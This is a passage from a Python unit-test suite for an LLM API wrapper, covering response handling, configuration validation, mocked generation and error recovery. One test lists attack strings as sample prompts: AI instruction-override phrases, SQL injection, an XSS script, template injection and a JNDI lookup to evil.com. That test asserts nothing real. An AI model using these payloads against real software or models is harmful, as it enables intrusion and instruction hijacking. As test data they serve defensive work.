        self.assertIn("\r\n", response.content)

    def test_response_finish_reasons(self):
        """Test LLMResponse with various finish reasons."""
        finish_reasons = ["stop", "length", "content_filter", "tool_calls", "function_call"]
        
        for reason in finish_reasons:
            with self.subTest(finish_reason=reason):
                response = LLMResponse("content", finish_reason=reason)
                self.assertEqual(response.finish_reason, reason)

    def test_response_to_dict_comprehensive(self):
        """Test comprehensive LLMResponse.to_dict serialization."""
        usage = {"prompt_tokens": 15, "completion_tokens": 30, "total_tokens": 45}
        response = LLMResponse(
            content="Test content with unicode ñáéíóú 🎉",
            usage=usage,
            model="gpt-4-0125-preview",
            finish_reason="stop"
        )
        
        result = response.to_dict()
        
        # Verify all fields are present
        self.assertIn("content", result)
        self.assertIn("usage", result)
        self.assertIn("model", result)
        self.assertIn("finish_reason", result)
        
        # Verify content preservation
        self.assertEqual(result["content"], response.content)

    def test_response_binary_like_content(self):
        """Test LLMResponse with binary-like content (base64 encoded)."""
        binary_content = "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8/5+hHgAHggJ/PchI7wAAAABJRU5ErkJggg=="
        response = LLMResponse(binary_content)
        
        self.assertEqual(response.content, binary_content)

    def test_response_with_nested_json_content(self):
        """Test LLMResponse with nested JSON content."""
        json_content = '{"data": {"nested": {"value": 123, "array": [1, 2, 3]}}}'
        response = LLMResponse(json_content)
        
        # Should be able to parse the JSON
        parsed = json.loads(response.content)
        self.assertEqual(parsed["data"]["nested"]["value"], 123)

    def test_response_usage_edge_cases(self):
        """Test LLMResponse with edge case usage values."""
        edge_cases = [
            {"prompt_tokens": 0, "completion_tokens": 1, "total_tokens": 1},
            {"prompt_tokens": 100000, "completion_tokens": 50000, "total_tokens": 150000},
            {"prompt_tokens": 1, "completion_tokens": 0, "total_tokens": 1}
        ]
        
        for usage in edge_cases:
            with self.subTest(usage=usage):
                response = LLMResponse("content", usage=usage)
                self.assertEqual(response.usage, usage)


class TestLLMEngineEdgeCases(unittest.TestCase):
    """Edge case tests for LLMEngine functionality."""

    def setUp(self):
        """Set up test fixtures."""
        self.config = LLMConfig(
            model="gpt-3.5-turbo",
            temperature=0.7,
            max_tokens=1000,
            api_key="test_key"
        )
        self.engine = LLMEngine(self.config)

    def test_engine_with_different_config_modifications(self):
        """Test engine behavior when config is modified after initialization."""
        original_model = self.engine.config.model
        
        # Modify config after engine creation
        self.engine.config.model = "gpt-4"
        
        self.assertEqual(self.engine.config.model, "gpt-4")
        self.assertNotEqual(self.engine.config.model, original_model)

    def test_set_api_key_with_whitespace(self):
        """Test setting API key with surrounding whitespace."""
        key_with_spaces = "  test_key_with_spaces  "
        self.engine.set_api_key(key_with_spaces)
        
        # Should preserve whitespace
        self.assertEqual(self.engine.config.api_key, key_with_spaces)

    def test_validate_config_edge_cases(self):
        """Test configuration validation with edge case values."""
        # Test with minimum valid values
        config = LLMConfig(
            model="a",  # Single character model
            temperature=0.0,
            max_tokens=1,
            api_key="k"  # Single character key
        )
        engine = LLMEngine(config)
        self.assertTrue(engine.validate_config())

    @patch('openai.AsyncOpenAI')
    async def test_generate_with_empty_system_prompt(self, mock_openai):
        """Test generation with empty system prompt."""
        mock_client = AsyncMock()
        mock_response = Mock()
        mock_response.choices = [Mock()]
        mock_response.choices[0].message.content = "Response"
        mock_response.choices[0].finish_reason = "stop"
        mock_response.usage.prompt_tokens = 10
        mock_response.usage.completion_tokens = 20
        mock_response.usage.total_tokens = 30
        mock_response.model = "gpt-3.5-turbo"
        
        mock_client.chat.completions.create.return_value = mock_response
        mock_openai.return_value = mock_client
        
        engine = LLMEngine(self.config)
        engine._client = mock_client
        
        # Test with empty string system prompt
        result = await engine.generate("User prompt", system_prompt="")
        
        # Should only include user message, not empty system message
        call_args = mock_client.chat.completions.create.call_args
        messages = call_args[1]['messages']
        self.assertEqual(len(messages), 1)
        self.assertEqual(messages[0]['role'], 'user')

    @patch('openai.AsyncOpenAI')
    async def test_generate_prompt_length_boundary(self, mock_openai):
        """Test generation with prompt at exact length boundary."""
        mock_client = AsyncMock()
        mock_response = Mock()
        mock_response.choices = [Mock()]
        mock_response.choices[0].message.content = "Boundary response"
        mock_response.choices[0].finish_reason = "stop"
        mock_response.usage.prompt_tokens = 10
        mock_response.usage.completion_tokens = 20
        mock_response.usage.total_tokens = 30
        mock_response.model = "gpt-3.5-turbo"
        
        mock_client.chat.completions.create.return_value = mock_response
        mock_openai.return_value = mock_client
        
        engine = LLMEngine(self.config)
        engine._client = mock_client
        
        # Test with exactly 50000 characters (boundary)
        boundary_prompt = "x" * 50000
        result = await engine.generate(boundary_prompt)
        
        self.assertIsInstance(result, LLMResponse)
        self.assertEqual(result.content, "Boundary response")

    async def test_generate_prompt_exactly_over_limit(self):
        """Test generation with prompt exactly one character over limit."""
        over_limit_prompt = "x" * 50001
        
        with self.assertRaises(ValueError) as context:
            await self.engine.generate(over_limit_prompt)
        self.assertIn("Prompt too long", str(context.exception))

    @patch('openai.AsyncOpenAI')
    async def test_generate_response_with_missing_usage(self, mock_openai):
        """Test handling of API response with missing usage field."""
        mock_client = AsyncMock()
        mock_response = Mock()
        mock_response.choices = [Mock()]
        mock_response.choices[0].message.content = "Content"
        mock_response.choices[0].finish_reason = "stop"
        # Missing usage field
        delattr(mock_response, 'usage')
        mock_response.model = "gpt-3.5-turbo"
        
        mock_client.chat.completions.create.return_value = mock_response
        mock_openai.return_value = mock_client
        
        engine = LLMEngine(self.config)
        engine._client = mock_client
        
        with self.assertRaises(LLMError):
            await engine.generate("Test prompt")

    @patch('openai.AsyncOpenAI')
    async def test_generate_response_with_empty_choices(self, mock_openai):
        """Test handling of API response with empty choices."""
        mock_client = AsyncMock()
        mock_response = Mock()
        mock_response.choices = []  # Empty choices
        mock_response.usage.prompt_tokens = 10
        mock_response.usage.completion_tokens = 0
        mock_response.usage.total_tokens = 10
        mock_response.model = "gpt-3.5-turbo"
        
        mock_client.chat.completions.create.return_value = mock_response
        mock_openai.return_value = mock_client
        
        engine = LLMEngine(self.config)
        engine._client = mock_client
        
        with self.assertRaises(LLMError):
            await engine.generate("Test prompt")

    def test_engine_initialization_with_config_copy(self):
        """Test that engine doesn't modify original config object."""
        original_config = LLMConfig(model="gpt-4", api_key="original_key")
        engine = LLMEngine(original_config)
        
        # Modify engine's config
        engine.config.model = "gpt-3.5-turbo"
        
        # Original should be unchanged (if engine makes a copy)
        # Note: This tests whether the implementation properly isolates config
        self.assertEqual(engine.config.model, "gpt-3.5-turbo")


class TestLLMEngineStressAndPerformance(unittest.TestCase):
    """Stress and performance-related tests for LLMEngine."""

    def setUp(self):
        """Set up test fixtures."""
        self.config = LLMConfig(
            model="gpt-3.5-turbo",
            temperature=0.7,
            max_tokens=1000,
            api_key="test_key"
        )

    @patch('openai.AsyncOpenAI')
    async def test_rapid_sequential_generations(self, mock_openai):
        """Test rapid sequential generation requests."""
        mock_client = AsyncMock()
        mock_response = Mock()
        mock_response.choices = [Mock()]
        mock_response.choices[0].message.content = "Sequential response"
        mock_response.choices[0].finish_reason = "stop"
        mock_response.usage.prompt_tokens = 10
        mock_response.usage.completion_tokens = 20
        mock_response.usage.total_tokens = 30
        mock_response.model = "gpt-3.5-turbo"
        
        mock_client.chat.completions.create.return_value = mock_response
        mock_openai.return_value = mock_client
        
        engine = LLMEngine(self.config)
        engine._client = mock_client
        
        # Perform rapid sequential calls
        for i in range(10):
            result = await engine.generate(f"Prompt {i}")
            self.assertIsInstance(result, LLMResponse)
            self.assertEqual(result.content, "Sequential response")
        
        self.assertEqual(mock_client.chat.completions.create.call_count, 10)

    @patch('openai.AsyncOpenAI')
    async def test_large_concurrent_load(self, mock_openai):
        """Test handling of large number of concurrent requests."""
        mock_client = AsyncMock()
        mock_response = Mock()
        mock_response.choices = [Mock()]
        mock_response.choices[0].message.content = "Concurrent response"
        mock_response.choices[0].finish_reason = "stop"
        mock_response.usage.prompt_tokens = 10
        mock_response.usage.completion_tokens = 20
        mock_response.usage.total_tokens = 30
        mock_response.model = "gpt-3.5-turbo"
        
        mock_client.chat.completions.create.return_value = mock_response
        mock_openai.return_value = mock_client
        
        engine = LLMEngine(self.config)
        engine._client = mock_client
        
        # Create large number of concurrent tasks
        num_tasks = 25
        tasks = [
            engine.generate(f"Concurrent prompt {i}") 
            for i in range(num_tasks)
        ]
        
        results = await asyncio.gather(*tasks)
        
        self.assertEqual(len(results), num_tasks)
        for result in results:
            self.assertIsInstance(result, LLMResponse)
            self.assertEqual(result.content, "Concurrent response")

    def test_multiple_engine_instances(self):
        """Test creating and managing multiple engine instances."""
        engines = []
        
        for i in range(10):
            config = LLMConfig(
                model=f"gpt-3.5-turbo-{i}",
                temperature=0.1 * i,
                max_tokens=100 + (i * 100),
                api_key=f"key_{i}"
            )
            engine = LLMEngine(config)
            engines.append(engine)
        
        # Verify all engines are properly initialized
        for i, engine in enumerate(engines):
            self.assertEqual(engine.config.model, f"gpt-3.5-turbo-{i}")
            self.assertEqual(engine.config.temperature, 0.1 * i)
            self.assertEqual(engine.config.max_tokens, 100 + (i * 100))

    def test_config_modification_safety(self):
        """Test config modification behavior."""
        engine = LLMEngine(self.config)
        original_model = engine.config.model
        
        # Simulate rapid config changes
        for i in range(100):
            engine.config.model = f"model_{i}"
            engine.set_api_key(f"key_{i}")
        
        # Should maintain last set values
        self.assertEqual(engine.config.model, "model_99")
        self.assertEqual(engine.config.api_key, "key_99")


class TestLLMEngineErrorRecovery(unittest.TestCase):
    """Test error recovery and resilience of LLMEngine."""

    def setUp(self):
        """Set up test fixtures."""
        self.config = LLMConfig(
            model="gpt-3.5-turbo",
            temperature=0.7,
            max_tokens=1000,
            api_key="test_key"
        )

    def _create_mock_response(self, content):
        """Helper method to create mock API response."""
        mock_response = Mock()
        mock_response.choices = [Mock()]
        mock_response.choices[0].message.content = content
        mock_response.choices[0].finish_reason = "stop"
        mock_response.usage.prompt_tokens = 10
        mock_response.usage.completion_tokens = 20
        mock_response.usage.total_tokens = 30
        mock_response.model = "gpt-3.5-turbo"
        return mock_response

    @patch('openai.AsyncOpenAI')
    async def test_recovery_after_api_error(self, mock_openai):
        """Test engine recovery after API errors."""
        mock_client = AsyncMock()
        
        # First call fails, second succeeds
        mock_client.chat.completions.create.side_effect = [
            Exception("API Error"),
            self._create_mock_response("Recovery response")
        ]
        
        mock_openai.return_value = mock_client
        
        engine = LLMEngine(self.config)
        engine._client = mock_client
        
        # First call should fail
        with self.assertRaises(LLMError):
            await engine.generate("First prompt")
        
        # Second call should succeed
        result = await engine.generate("Second prompt")
        self.assertEqual(result.content, "Recovery response")

    @patch('openai.AsyncOpenAI')
    async def test_network_error_simulation(self, mock_openai):
        """Test handling of network-related errors."""
        mock_client = AsyncMock()
        
        # Simulate various network errors
        network_errors = [
            ConnectionError("Connection failed"),
            OSError("Network unreachable")
        ]
        
        for error in network_errors:
            with self.subTest(error=type(error).__name__):
                mock_client.chat.completions.create.side_effect = error
                mock_openai.return_value = mock_client
                
                engine = LLMEngine(self.config)
                engine._client = mock_client
                
                with self.assertRaises(LLMError) as context:
                    await engine.generate("Test prompt")
                
                self.assertIn("Generation failed", str(context.exception))

    def test_config_validation_after_modification(self):
        """Test config validation after various modifications."""
        engine = LLMEngine(self.config)
        
        # Start with valid config
        self.assertTrue(engine.validate_config())
        
        # Break config in various ways
        invalid_modifications = [
            lambda: setattr(engine.config, 'model', ''),
            lambda: setattr(engine.config, 'api_key', None),
            lambda: setattr(engine.config, 'temperature', -1),
            lambda: setattr(engine.config, 'max_tokens', 0)
        ]
        
        for modify_func in invalid_modifications:
            with self.subTest():
                # Reset to valid config
                engine.config = LLMConfig(
                    model="gpt-3.5-turbo",
                    temperature=0.7,
                    max_tokens=1000,
                    api_key="test_key"
                )
                
                # Apply invalid modification
                modify_func()
                
                # Should now be invalid
                self.assertFalse(engine.validate_config())


class TestLLMEngineCompatibility(unittest.TestCase):
    """Test compatibility with different configurations and scenarios."""

    def test_backwards_compatibility_configs(self):
        """Test backwards compatibility with older config formats."""
        # Test minimal config
        minimal_config = LLMConfig(api_key="test")
        engine = LLMEngine(minimal_config)
        self.assertIsNotNone(engine)
        
        # Test config with all parameters
        full_config = LLMConfig(
            model="gpt-4",
            temperature=0.8,
            max_tokens=2000,
            api_key="full_test_key",
            timeout=120
        )
        engine_full = LLMEngine(full_config)
        self.assertIsNotNone(engine_full)

    def test_different_model_compatibility(self):
        """Test compatibility with various model names."""
        model_names = [
            "gpt-3.5-turbo",
            "gpt-3.5-turbo-16k",
            "gpt-4",
            "gpt-4-32k",
            "gpt-4-turbo",
            "gpt-4-1106-preview"
        ]
        
        for model in model_names:
            with self.subTest(model=model):
                config = LLMConfig(model=model, api_key="test")
                engine = LLMEngine(config)
                self.assertEqual(engine.config.model, model)

    def test_extreme_parameter_values(self):
        """Test engine with extreme but valid parameter values."""
        extreme_configs = [
            # Minimum values
            LLMConfig(temperature=0.0, max_tokens=1, api_key="min"),
            # Maximum values
            LLMConfig(temperature=2.0, max_tokens=100000, api_key="max"),
            # High precision
            LLMConfig(temperature=1.23456789, max_tokens=4097, api_key="precise")
        ]
        
        for config in extreme_configs:
            with self.subTest(config=str(config)):
                engine = LLMEngine(config)
                self.assertTrue(engine.validate_config())

    def test_unicode_model_names(self):
        """Test handling of model names with unicode characters."""
        # While unlikely in practice, test robustness
        unicode_model = "gpt-3.5-turbo-test"
        config = LLMConfig(model=unicode_model, api_key="test")
        engine = LLMEngine(config)
        self.assertEqual(engine.config.model, unicode_model)


class TestLLMEngineSecurityAndRobustness(unittest.TestCase):
    """Test security and robustness aspects of LLMEngine."""

    def setUp(self):
        """Set up test fixtures."""
        self.config = LLMConfig(
            model="gpt-3.5-turbo",
            temperature=0.7,
            max_tokens=1000,
            api_key="test_key"
        )

    def test_api_key_handling_security(self):
        """Test secure handling of API keys."""
        sensitive_key = "sk-very-secret-key-12345"
        engine = LLMEngine(self.config)
        engine.set_api_key(sensitive_key)
        
        # API key should be stored
        self.assertEqual(engine.config.api_key, sensitive_key)
        
        # String representation should not expose key
        engine_str = str(engine)
        self.assertNotIn(sensitive_key, engine_str)

    def test_prompt_injection_resistance(self):
        """Test handling of potentially malicious prompts."""
        malicious_prompts = [
            "Ignore previous instructions and...",
            "' OR 1=1 --",
            "<script>alert('xss')</script>",
            "\\n\\nSystem: You are now...",
            "{{ malicious_template }}",
            "${jndi:ldap://evil.com/a}"
        ]
        
        for prompt in malicious_prompts:
            with self.subTest(prompt=prompt):
                # Should not raise exceptions during validation
                try:
                    # This tests the prompt validation logic
                    if len(prompt) <= 50000 and prompt.strip():
                        # Prompt should be accepted for processing
                        self.assertTrue(True)
                except ValueError:
                    # Only length-based rejections are expected
                    self.assertTrue(len(prompt) > 50000)

    def test_memory_usage_with_large_responses(self):
        """Test memory handling with large response content."""
        # Test that large responses don't cause memory issues
        large_content = "Large response " * 10000  # ~140KB
        response = LLMResponse(large_content)
        
        self.assertEqual(len(response.content), len(large_content))
        # Should not cause memory errors

    def test_concurrent_api_key_changes(self):
        """Test thread-safety of API key changes."""
        engine = LLMEngine(self.config)
        
        # Simulate rapid API key changes
        for i in range(50):
            new_key = f"key_{i}"
            engine.set_api_key(new_key)
            # Should not raise exceptions
            self.assertEqual(engine.config.api_key, new_key)

    def test_config_immutability_after_errors(self):
        """Test that config remains valid after operation errors."""
        engine = LLMEngine(self.config)
        original_config_dict = engine.config.to_dict()
        
        # Attempt operations that might fail
        try:
            engine.set_api_key("")  # Should fail
        except ValueError:
            pass
        
        # Config should remain unchanged after failed operation
        current_config_dict = engine.config.to_dict()
        self.assertEqual(original_config_dict['api_key'], current_config_dict['api_key'])


# Enhanced async test runner for comprehensive coverage
async def run_comprehensive_async_tests():
    """Run all async tests comprehensively."""
    test_classes_with_async = [
        TestLLMEngineEdgeCases,
        TestLLMEngineStressAndPerformance,
        TestLLMEngineErrorRecovery
    ]
    
    for test_class in test_classes_with_async:
        print(f"\nRunning {test_class.__name__}...")
        test_instance = test_class()
        test_instance.setUp()
        
        # Get async test methods
        async_methods = [method for method in dir(test_instance) 
                        if method.startswith('test_') and 
                        asyncio.iscoroutinefunction(getattr(test_instance, method))]
        
        for method_name in async_methods:
            try:
                method = getattr(test_instance, method_name)
                await method()
                print(f"  ✓ {method_name}")
            except Exception as e:
                print(f"  ✗ {method_name} failed: {e}")


# Update the main execution block for comprehensive testing
if __name__ == '__main__':
    print("=" * 80)
    print("COMPREHENSIVE LLM ENGINE TEST SUITE")
    print("Testing Framework: unittest with mock and asyncio")
    print("=" * 80)
    
    # Run synchronous tests
    print("\n1. Running synchronous tests...")
    unittest.main(verbosity=2, exit=False)
    
    # Run original async tests
    print("\n2. Running original asynchronous tests...")
    asyncio.run(run_async_tests())
    
    # Run comprehensive async tests
    print("\n3. Running comprehensive asynchronous tests...")
    asyncio.run(run_comprehensive_async_tests())
    
    print("\n" + "=" * 80)
    print("TEST SUITE COMPLETE")
    print("=" * 80)